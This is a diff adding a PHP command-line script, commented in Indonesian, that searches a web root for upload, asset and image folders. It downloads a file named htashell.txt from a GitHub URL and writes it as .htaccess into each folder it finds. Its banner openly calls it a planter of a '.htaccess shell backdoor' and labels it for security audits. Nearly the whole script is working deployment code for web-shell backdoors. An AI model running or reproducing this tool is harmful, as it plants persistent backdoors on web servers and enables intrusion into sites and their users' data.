@@ -1,0 +1,108 @@
+<?php
+
+// Pastikan skrip dijalankan dari command line atau dengan otentikasi yang ketat
+// Agar tidak dapat diakses sembarangan oleh publik.
+if (php_sapi_name() === 'cli' || (isset($_SERVER['PHP_AUTH_USER']) && $_SERVER['PHP_AUTH_USER'] === 'user_aman' && $_SERVER['PHP_AUTH_PW'] === 'password_kuat')) {
+    // URL file .htaccess yang akan diunggah
+    $htaccess_url = "https://raw.githubusercontent.com/Lucenox/Essentials/refs/heads/main/htashell.txt";
+    // Nama file tujuan
+    $target_filename = ".htaccess";
+
+    // Daftar nama direktori yang akan dicari
+    $target_dirs = ['upload', 'uploads', 'asset', 'assets', 'file', 'files', 'image', 'images'];
+
+    echo "=========================================================\n";
+    echo "       Pencari dan Penanam .htaccess Shell Backdoor\n";
+    echo "       (Digunakan untuk Audit Keamanan)\n";
+    echo "=========================================================\n\n";
+
+    // Ambil path dasar dari input pengguna
+    // Contoh: /var/www/html atau /home/user/public_html
+    $base_path = readline("Masukkan path dasar untuk pencarian (contoh: /var/www/html): ");
+    $base_path = rtrim($base_path, '/\\') . DIRECTORY_SEPARATOR;
+
+    // Pastikan path dasar valid
+    if (!is_dir($base_path)) {
+        echo "Error: Path dasar tidak valid atau tidak dapat diakses.\n";
+        exit;
+    }
+
+    echo "Mulai mencari direktori di: " . $base_path . "\n\n";
+
+    $found_target_dirs = [];
+    $uploaded_results = [];
+
+    // Fungsi rekursif untuk mencari direktori
+    function find_target_directories($path, $target_dirs, &$found_dirs) {
+        $items = @scandir($path); // Gunakan @ untuk menekan error izin
+        if ($items === false) {
+            // echo "Tidak dapat membaca direktori: " . $path . "\n";
+            return;
+        }
+
+        foreach ($items as $item) {
+            if ($item === '.' || $item === '..') {
+                continue;
+            }
+
+            $full_path = $path . DIRECTORY_SEPARATOR . $item;
+
+            if (is_dir($full_path)) {
+                if (in_array(strtolower($item), $target_dirs)) {
+                    $found_dirs[] = $full_path;
+                    echo "Ditemukan direktori target: " . $full_path . "\n";
+                }
+                // Lakukan pencarian rekursif
+                find_target_directories($full_path, $target_dirs, $found_dirs);
+            }
+        }
+    }
+
+    find_target_directories($base_path, $target_dirs, $found_target_dirs);
+
+    if (empty($found_target_dirs)) {
+        echo "Tidak ada direktori target yang ditemukan.\n";
+    } else {
+        echo "\nMemulai proses pengunggahan .htaccess ke direktori yang ditemukan...\n\n";
+
+        // Ambil konten file .htaccess dari URL
+        $htaccess_content = @file_get_contents($htaccess_url);
+
+        if ($htaccess_content === false) {
+            echo "Error: Gagal mengambil konten .htaccess dari URL: {$htaccess_url}\n";
+        } else {
+            foreach ($found_target_dirs as $dir) {
+                $target_path = $dir . DIRECTORY_SEPARATOR . $target_filename;
+                $result_message = "gagal di tanam (error tidak diketahui)"; // Default error message
+
+                // Coba tulis file
+                if (@file_put_contents($target_path, $htaccess_content) !== false) {
+                    $result_message = ".htaccess berhasil di tanam";
+                } else {
+                    $result_message = "gagal di tanam (izin menulis)";
+                }
+                $uploaded_results[] = "{$target_path} -> {$result_message}";
+            }
+        }
+    }
+
+    echo "\n=========================================================\n";
+    echo "                       Result Laporan\n";
+    echo "=========================================================\n";
+    if (empty($uploaded_results)) {
+        echo "Tidak ada operasi penanaman .htaccess yang dilakukan.\n";
+    } else {
+        foreach ($uploaded_results as $result) {
+            echo $result . "\n";
+        }
+    }
+    echo "=========================================================\n";
+
+} else {
+    echo "Akses ditolak. Skrip ini hanya bisa dijalankan dari CLI atau dengan otentikasi HTTP yang benar.\n";
+    header('WWW-Authenticate: Basic realm="Restricted Area"');
+    header('HTTP/1.0 401 Unauthorized');
+    exit;
+}
+
+?>
